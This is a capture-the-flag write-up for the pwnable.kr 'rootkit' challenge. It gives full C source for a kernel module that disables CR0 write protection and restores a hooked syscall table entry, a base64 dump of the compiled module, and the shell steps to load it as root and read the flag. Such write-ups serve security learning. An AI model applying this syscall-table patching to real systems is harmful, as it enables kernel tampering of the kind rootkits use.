# pwnable.kr -- Grotesque -- rootkit

## 1. Challenge

```
Server admin says he can't access a file even if he has root.
Can you access the file?

Download : http://pwnable.kr/bin/rootkit

ssh rootkit@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Download the binary and drop it into IDA. You will find it is a kernel module and it will modify values at 

```
// SYS_CALL_TABLE = 0xC15FA020
&SYS_CALL_TABLE[SYS_open]
&SYS_CALL_TABLE[SYS_openat]
&SYS_CALL_TABLE[SYS_symlink]
&SYS_CALL_TABLE[SYS_symlinkat]
&SYS_CALL_TABLE[SYS_link]
&SYS_CALL_TABLE[SYS_linkat]
&SYS_CALL_TABLE[SYS_rename]
&SYS_CALL_TABLE[SYS_renameat]
```

to custom functions, which as known as is hooked.

All of hooking functions filters paths that have substring `"flag"` so all of operations like opening `flag` file, renaming `flag` file, creating symbol-link to `flag` file will fail.

Fortunately, we are logined as root and we can load our custom kernel module to recover `SYS_CALL_TABLE`.

```c
// solve.c
#include <linux/module.h>
#include <linux/kernel.h>

#define SYS_CALL_TABLE ((void**)0xC15FA020)
#define SYS_open 5
#define sys_open ((void*)0xc1158d70)

int init_module(void) {
    // disable write-protection
    __asm__ __volatile__(
        "cli;"
        "mov %cr0, %eax;"
        "and $0xFFFEFFFF, %eax;"
        "mov %eax, %cr0;"
    );

    SYS_CALL_TABLE[SYS_open] = sys_open;

    // enable write-protection
    __asm__ __volatile__(
        "mov %cr0, %eax;"
        "or $0x10000, %eax;"
        "mov %eax, %cr0;"
        "sti;"
    );
    return 0;
}

void cleanup_module(void) {

}
```

In Ubuntu 16.04 32-bit, download and install linux 3.7.1 kernel headers before compiling our kernel module.

```console
$ wget 'https://kernel.ubuntu.com/~kernel-ppa/mainline/v3.7.1-raring/linux-headers-3.7.1-030701-generic_3.7.1-030701.201212171620_i386.deb'

$ wget 'https://kernel.ubuntu.com/~kernel-ppa/mainline/v3.7.1-raring/linux-headers-3.7.1-030701_3.7.1-030701.201212171620_all.deb'

$ sudo dpkg -i ./linux-headers-3.7.1-030701-generic_3.7.1-030701.201212171620_i386.deb ./linux-headers-3.7.1-030701_3.7.1-030701.201212171620_all.deb
```

Then compile

```console
$ make all
```

You will get some files:

```console
total 148
drwxrwxr-x 3 doublesine doublesine  4096 Feb 22 01:28 .
drwxr-xr-x 3 doublesine doublesine  4096 Feb 21 23:58 ..
-rw-rw-r-- 1 doublesine doublesine 47114 Feb 21 23:38 .cache.mk
-rw-rw-r-- 1 doublesine doublesine   161 Feb 21 23:52 Makefile
-rw-rw-r-- 1 doublesine doublesine    47 Feb 22 01:28 modules.order
-rw-rw-r-- 1 doublesine doublesine     0 Feb 22 01:28 Module.symvers
-rw-rw-r-- 1 doublesine doublesine   592 Feb 22 00:55 solve.c
-rw-rw-r-- 1 doublesine doublesine  2248 Feb 22 01:28 solve.ko
-rw-rw-r-- 1 doublesine doublesine   275 Feb 22 01:28 .solve.ko.cmd
-rw-rw-r-- 1 doublesine doublesine   663 Feb 22 01:28 solve.mod.c
-rw-rw-r-- 1 doublesine doublesine  1764 Feb 22 01:28 solve.mod.o
-rw-rw-r-- 1 doublesine doublesine 28195 Feb 22 01:28 .solve.mod.o.cmd
-rw-rw-r-- 1 doublesine doublesine  1460 Feb 22 01:28 solve.o
-rw-rw-r-- 1 doublesine doublesine 28092 Feb 22 01:28 .solve.o.cmd
```

The binary file of our module is `solve.ko`. We can use base64 to upload our kernel module to target machine.

```console
$ base64 ./solve.ko
f0VMRgEBAQAAAAAAAAAAAAEAAwABAAAAAAAAAAAAAAAgBgAAAAAAADQAAAAAACgAEQAOAAQAAAAU
AAAAAwAAAEdOVQDg82MWvvmFraAIxHhpiLY0t0wxRAAAAAAAAAAAVYnl6Pz////6DyDAJf///v8P
IsDHBTSgX8FwjRXBDyDADQAAAQAPIsD7McBdw2aQVYnl6Pz///9dwwAAAwAAADMAAABzcmN2ZXJz
aW9uPUVCRDlGNjk3NUE0QkI1QkRDRDA2QTJEAGRlcGVuZHM9AHZlcm1hZ2ljPTMuNy4xLTAzMDcw
MS1nZW5lcmljIFNNUCBtb2RfdW5sb2FkIG1vZHZlcnNpb25zIDY4NiAAAAAAAAAAAAAAAAAAAAAA
AAAAiI2b021vZHVsZV9sYXlvdXQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAJoPObRtY291bnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABzb2x2ZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAR0NDOiAoVWJ1bnR1L0xpbmFybyA0LjcuNC0zdWJ1bnR1MTIpIDQuNy40AABHQ0M6IChVYnVu
dHUvTGluYXJvIDQuNy40LTN1YnVudHUxMikgNC43LjQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAMAAQAAAAAAAAAAAAAAAAADAAIAAAAAAAAAAAAAAAAAAwAEAAAAAAAAAAAAAAAAAAMABgAA
AAAAAAAAAAAAAAADAAcAAAAAAAAAAAAAAAAAAwAIAAAAAAAAAAAAAAAAAAMACQAAAAAAAAAAAAAA
AAADAAsAAAAAAAAAAAAAAAAAAwAMAAAAAAAAAAAAAAAAAAMADQABAAAAAAAAAAAAAAAEAPH/CQAA
AAAAAAAAAAAABADx/xUAAAAAAAAAIwAAAAEABgAoAAAAIwAAAAkAAAABAAYAOQAAAAAAAACAAAAA
AQAHAEYAAAAsAAAAPgAAAAEABgBWAAAAAAAAAIABAAARAAkAZAAAADAAAAAKAAAAEgACAHMAAAAA
AAAALgAAABIAAgB/AAAAAAAAAAAAAAAQAAAAAHNvbHZlLmMAc29sdmUubW9kLmMAX19tb2Rfc3Jj
dmVyc2lvbjMwAF9fbW9kdWxlX2RlcGVuZHMAX19fX3ZlcnNpb25zAF9fbW9kX3Zlcm1hZ2ljNQBf
X3RoaXNfbW9kdWxlAGNsZWFudXBfbW9kdWxlAGluaXRfbW9kdWxlAG1jb3VudAAAAAQAAAACFAAA
NAAAAAIUAAAAAAAAAQIAAAQAAAABAgAA2AAAAAETAAB4AQAAARIAAAAuc3ltdGFiAC5zdHJ0YWIA
LnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAucmVsLnRleHQALnJlbF9fbWNvdW50X2xvYwAu
bW9kaW5mbwBfX3ZlcnNpb25zAC5kYXRhAC5yZWwuZ251LmxpbmtvbmNlLnRoaXNfbW9kdWxlAC5i
c3MALmNvbW1lbnQALm5vdGUuR05VLXN0YWNrAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADQAAAAkAAAAAAAAAAAAAAAEAAAAAAAAADIAAAAB
AAAABgAAAAAAAABgAAAAOgAAAAAAAAAAAAAAEAAAAAAAAAAuAAAACQAAAEAAAAAAAAAAUAUAABAA
AAAPAAAAAgAAAAQAAAAIAAAAPAAAAAEAAAACAAAAAAAAAJwAAAAIAAAAAAAAAAAAAAAEAAAAAAAA
ADgAAAAJAAAAQAAAAAAAAABgBQAAEAAAAA8AAAAEAAAABAAAAAgAAABJAAAAAQAAAAIAAAAAAAAA
pAAAAGoAAAAAAAAAAAAAAAEAAAAAAAAAUgAAAAEAAAACAAAAAAAAACABAACAAAAAAAAAAAAAAAAg
AAAAAAAAAF0AAAABAAAAAwAAAAAAAACgAQAAAAAAAAAAAAAAAAAAAQAAAAAAAABnAAAAAQAAAAMA
AAAAAAAAoAEAAIABAAAAAAAAAAAAACAAAAAAAAAAYwAAAAkAAABAAAAAAAAAAHAFAAAQAAAADwAA
AAkAAAAEAAAACAAAAIEAAAAIAAAAAwAAAAAAAAAgAwAAAAAAAAAAAAAAAAAAAQAAAAAAAACGAAAA
AQAAADAAAAAAAAAAIAMAAFgAAAAAAAAAAAAAAAEAAAABAAAAjwAAAAEAAAAAAAAAAAAAAHgDAAAA
AAAAAAAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAACABQAAnwAAAAAAAAAAAAAAAQAAAAAA
AAABAAAAAgAAAAAAAAAAAAAAeAMAAFABAAAQAAAAEQAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAA
AMgEAACGAAAAAAAAAAAAAAABAAAAAAAAAA==

// ssh rootkit@pwnable.kr -p2222

$ cd tmp

$ cat > solve.ko.b64
// paste base64 string you get to here

$ base64 -d ./solve.ko.b64 > ./solve.ko

$ insmod ./solve.ko
```

Now our kernel module has been loaded, let's see flag directly.

```console
$ cat /flag
// some unrecognizable characters
// it should be binary file
// use base64 to dump out

$ base64 /flag
...
...

// switch to our machine

$ cat > flag.b64
// paste here

$ base64 -d ./flag.b64 > ./flag

$ binwalk ./flag
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, from Unix, last modified: 2015-07-24 16:54:31

$ mv ./flag ./flag.gz

$ tar -xvzf ./flag.gz

$ cat flag
... // you will get flag here
```

